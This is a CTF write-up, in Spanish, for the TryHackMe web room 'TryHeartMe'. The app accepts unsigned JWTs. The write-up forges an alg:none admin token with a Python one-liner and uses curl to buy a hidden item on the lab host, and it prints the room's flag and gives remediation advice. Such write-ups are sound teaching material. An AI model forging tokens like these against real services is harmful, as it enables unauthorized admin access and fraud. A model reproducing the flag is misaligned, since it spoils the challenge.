# TryHeartMe — Writeup

| Field      | Value                          |
| ---------- | ------------------------------ |
| Platform   | TryHackMe                      |
| Category   | Web                            |
| Difficulty | Easy                           |
| Points     | 100                            |
| Target     | `http://10.67.181.145:5000`    |

## Summary

Shop web vulnerable a **JWT `alg:none` confusion**. El servidor acepta tokens sin firma y confía en el claim `role`, lo que permite escalar a `admin`, inyectar créditos y comprar el ítem oculto `ValenFlag`.

## Enumeration

- Home muestra 4 productos (`rose-bouquet`, `heart-choco`, `strawberry-dip`, `love-letter`).
- `Login` / `Register` emiten una cookie JWT `tryheartme_jwt` (HS256).
- Payload decodificado:

  ```json
  {"email":"test@test.local","role":"user","credits":0,"iat":1782750392,"theme":"valentine"}
  ```

- `/admin` responde `403` cuando hay sesión autenticada → confirma que existe un rol `admin`.
- `/buy/valenflag` con `POST` devuelve `404` como usuario normal (ítem oculto, sólo staff).

## Vulnerabilidad

El backend decodifica el JWT y confía en el header `alg`. No rechaza `alg:none`, así que un atacante puede construir un token sin firma con `role: admin` y el servidor lo acepta como válido.

## Explotación

Forjar un JWT `alg:none` con privilegios de admin y créditos suficientes, comprar el ítem y leer el voucher.

```bash
# 1) Forjar JWT alg:none (sin firma)
TOK=$(python3 -W ignore -c "
import base64, json, time
hdr  = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
body = {'email':'test@test.local','role':'admin','credits':99999,'iat':int(time.time()),'theme':'valentine'}
pay  = base64.urlsafe_b64encode(json.dumps(body).encode()).rstrip(b'=').decode()
print(f'{hdr}.{pay}.')
")

# 2) Comprar el ítem oculto (POST, NO seguir redirect con POST)
curl -s -c jar.txt -H "Cookie: tryheartme_jwt=$TOK" \
     -X POST http://10.67.181.145:5000/buy/valenflag -o /dev/null

# 3) Leer el voucher (GET)
curl -s -b jar.txt http://10.67.181.145:5000/receipt/valenflag
```

Cuidado: `curl -L` re-envía el `POST` al `/receipt/valenflag` y da `405`. Capturar primero el `Set-Cookie` y luego hacer `GET`.

## Flag

```
THM{v4l3nt1n3_jwt_c00k13_t4mp3r_4dm1n_sh0p}
```

## Remediación

- Rechazar explícitamente `alg:none` y cualquier algoritmo distinto al esperado (HS256 *o* RS256, nunca mezclarlos).
- Fijar el algoritmo en el código, no leerlo del header.
- Verificar la firma siempre, aunque el header diga `none`.
- Derivar créditos/rol desde una fuente autoritativa (DB), nunca desde claims del JWT.
- Considerar `aud` / `iss` y expiración corta (`exp`) en los tokens.

## Notas

- El bug es exactamente el clásico de la [vulnerabilidad CVE-2015-9235](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/) en librerías JWT mal configuradas.
- Room resuelto en pocos pasos: enumeración → forjar `alg:none` → comprar ítem staff-only.
